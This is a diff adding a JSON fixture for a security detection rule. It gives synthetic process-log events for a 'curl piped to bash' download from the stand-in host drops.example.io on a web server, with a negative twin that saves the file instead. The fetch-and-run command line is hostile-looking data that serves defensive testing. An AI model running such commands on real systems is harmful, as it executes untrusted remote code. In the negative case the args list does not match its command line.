@@ -1,0 +1,230 @@
+{
+  "rule": {
+    "source": "prebuilt",
+    "rule_id": "3ebdc01e-7788-4845-8e7a-c8a671ad46ea"
+  },
+  "chain": "linux-curl",
+  "step": "curl to drops.example.io piped to bash",
+  "positive": {
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "exec",
+            "kind": "event"
+          },
+          "host": {
+            "name": "web-prod-07",
+            "id": "azqa-web-prod-07",
+            "os": {
+              "type": "linux",
+              "family": "debian"
+            },
+            "hostname": "web-prod-07"
+          },
+          "user": {
+            "name": "www-data",
+            "id": "33"
+          },
+          "process": {
+            "name": "curl",
+            "executable": "/usr/bin/curl",
+            "command_line": "curl -fsSL https://drops.example.io/install.sh",
+            "args": [
+              "curl",
+              "-fsSL",
+              "https://drops.example.io/install.sh"
+            ],
+            "args_count": 3,
+            "entity_id": "azqa-curl-001",
+            "working_directory": "/var/www/html",
+            "user": {
+              "id": "33"
+            },
+            "real_user": {
+              "id": "33"
+            },
+            "parent": {
+              "name": "sh",
+              "executable": "/bin/sh",
+              "entity_id": "azqa-sh-curl-parent",
+              "command_line": "/bin/sh"
+            }
+          }
+        }
+      },
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -119.6,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "end"
+            ],
+            "action": "end",
+            "kind": "event"
+          },
+          "host": {
+            "name": "web-prod-07",
+            "id": "azqa-web-prod-07",
+            "os": {
+              "type": "linux",
+              "family": "debian"
+            },
+            "hostname": "web-prod-07"
+          },
+          "user": {
+            "name": "www-data",
+            "id": "33"
+          },
+          "process": {
+            "name": "bash",
+            "executable": "/bin/bash",
+            "command_line": "bash",
+            "args": [
+              "bash"
+            ],
+            "args_count": 1,
+            "entity_id": "azqa-bash-001",
+            "working_directory": "/var/www/html",
+            "user": {
+              "id": "33"
+            },
+            "real_user": {
+              "id": "33"
+            },
+            "parent": {
+              "name": "sh",
+              "executable": "/bin/sh",
+              "entity_id": "azqa-sh-curl-parent",
+              "command_line": "/bin/sh"
+            }
+          }
+        }
+      }
+    ]
+  },
+  "negative": {
+    "twin_delta": "curl writes to a file with -o (download not piped to an interpreter)",
+    "docs": [
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -120,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "start"
+            ],
+            "action": "exec",
+            "kind": "event"
+          },
+          "host": {
+            "name": "web-prod-07",
+            "id": "azqa-web-prod-07",
+            "os": {
+              "type": "linux",
+              "family": "debian"
+            },
+            "hostname": "web-prod-07"
+          },
+          "user": {
+            "name": "www-data",
+            "id": "33"
+          },
+          "process": {
+            "name": "curl",
+            "executable": "/usr/bin/curl",
+            "command_line": "curl -fsSL -o /tmp/install.sh https://drops.example.io/install.sh",
+            "args": [
+              "curl",
+              "-fsSL",
+              "-o",
+              "/tmp/install.sh"
+            ],
+            "args_count": 4,
+            "entity_id": "azqa-curl-001",
+            "working_directory": "/var/www/html",
+            "user": {
+              "id": "33"
+            },
+            "real_user": {
+              "id": "33"
+            },
+            "parent": {
+              "name": "sh",
+              "executable": "/bin/sh",
+              "entity_id": "azqa-sh-curl-parent",
+              "command_line": "/bin/sh"
+            }
+          }
+        }
+      },
+      {
+        "stream": "logs-endpoint.events.process",
+        "at": -119.6,
+        "doc": {
+          "event": {
+            "category": [
+              "process"
+            ],
+            "type": [
+              "end"
+            ],
+            "action": "end",
+            "kind": "event"
+          },
+          "host": {
+            "name": "web-prod-07",
+            "id": "azqa-web-prod-07",
+            "os": {
+              "type": "linux",
+              "family": "debian"
+            },
+            "hostname": "web-prod-07"
+          },
+          "user": {
+            "name": "www-data",
+            "id": "33"
+          },
+          "process": {
+            "name": "bash",
+            "executable": "/bin/bash",
+            "command_line": "bash",
+            "args": [
+              "bash"
+            ],
+            "args_count": 1,
+            "entity_id": "azqa-bash-001",
+            "working_directory": "/var/www/html",
+            "user": {
+              "id": "33"
+            },
+            "real_user": {
+              "id": "33"
+            },
+            "parent": {
+              "name": "sh",
+              "executable": "/bin/sh",
+              "entity_id": "azqa-sh-curl-parent",
+              "command_line": "/bin/sh"
+            }
+          }
+        }
+      }
+    ]
+  }
+}
